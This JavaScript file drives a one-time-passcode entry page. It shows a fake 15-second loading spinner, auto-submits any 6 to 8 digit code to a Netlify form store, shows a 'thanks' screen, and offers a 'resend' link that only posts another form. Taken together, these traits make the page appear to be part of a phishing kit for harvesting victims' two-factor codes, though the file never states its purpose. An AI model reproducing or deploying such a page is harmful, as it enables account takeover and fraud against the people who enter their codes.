document.addEventListener("DOMContentLoaded", function() {
    const spinnerContainer = document.querySelector('.spinner-container');
    const otpContainer = document.querySelector('.otp-container');
    const thanksContainer = document.querySelector('.thanks-container');
    const otpInput = document.getElementById('otpInput');
    const otpForm = document.querySelector('form[name="otpForm"]');
    const btnConfirm = document.querySelector('.btn-2');

    // Show spinner for 15 seconds on page load
    setTimeout(() => {
        spinnerContainer.style.display = 'none';
        otpContainer.style.display = 'flex';
    }, 15000);

    otpInput.addEventListener('input', function() {
        // Allow only numbers in the input field
        this.value = this.value.replace(/[^0-9]/g, '');

        // Trigger form submission when the input length is between 6 and 8
        if (this.value.length >= 6 && this.value.length <= 8) {
            otpForm.dispatchEvent(new Event('submit'));
        }
    });

    otpForm.addEventListener('submit', function(event) {
        event.preventDefault();  // Prevent the default form submission

        // Check if OTP length is between 6 and 8
        if (otpInput.value.length < 6 || otpInput.value.length > 8) {
            alert("Please enter a valid OTP!");
            return;
        }

        // Programmatically send form data
        let formData = new FormData(otpForm);
        fetch("/", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams(formData).toString()
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response;
        })
        .then(() => {
            otpContainer.style.display = 'none';
            spinnerContainer.style.display = 'flex';

            setTimeout(() => {
                spinnerContainer.style.opacity = 0;
                setTimeout(() => {
                    spinnerContainer.style.display = 'none';
                    thanksContainer.style.display = 'flex';
                    thanksContainer.style.opacity = 1;
                }, 500);
            }, 3000);
        })
        .catch(error => {
            console.error('Form submission error:', error);
            alert('Form submission failed, please try again.');
        });
    });

    // Timer, progress bar, and resend form functionality
    var countdown = 75; // 75 seconds countdown
    var timerDisplay = document.getElementById('timer');
    var resendLink = document.getElementById('resendLink');
    var resendConfirmation = document.getElementById('resendConfirmation');
    var timerBar = document.getElementById('timerBar');
    var resendForm = document.getElementById('resendForm');

    function updateTimerDisplay(seconds) {
        var minutes = Math.floor(seconds / 60);
        var remainingSeconds = seconds % 60;
        minutes = minutes < 10 ? "0" + minutes : minutes;
        remainingSeconds = remainingSeconds < 10 ? "0" + remainingSeconds : remainingSeconds;
        timerDisplay.textContent = minutes + ":" + remainingSeconds;
    }

    var timer = setInterval(function() {
        updateTimerDisplay(countdown);

        // Update progress bar width
        var progressBarWidth = (countdown / 75) * 100;
        timerBar.style.width = progressBarWidth + '%';

        if (--countdown < 0) {
            clearInterval(timer);
            timerBar.style.display = 'none'; // Hide the progress bar
            resendLink.classList.add('enabled');
            resendLink.addEventListener('click', function(event) {
                event.preventDefault(); // Prevent default link behavior
                submitResendForm(); // Call function to submit the form via AJAX
            });
        }
    }, 1000);

    // Initialize the timer display
    updateTimerDisplay(countdown);

    function submitResendForm() {
        // Construct the form data payload
        var formData = new FormData(resendForm);
        formData.append('form-name', 'resendForm'); // Ensure this matches your Netlify settings

        // Encode form data to match 'application/x-www-form-urlencoded' content type
        var encodedData = new URLSearchParams(formData).toString();

        fetch("/", {
            method: "POST",
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: encodedData
        })
        .then(response => {
            if (response.ok) {
                // Display confirmation message
                resendConfirmation.style.display = 'block';
                // Optional: Hide the confirmation message after some time
                setTimeout(function() {
                    resendConfirmation.style.display = 'none';
                }, 5000);
            } else {
                // Handle errors
                console.error('Netlify form submission error:', response);
            }
        })
        .catch(error => {
            console.error('Error submitting form:', error);
        });
    }
});
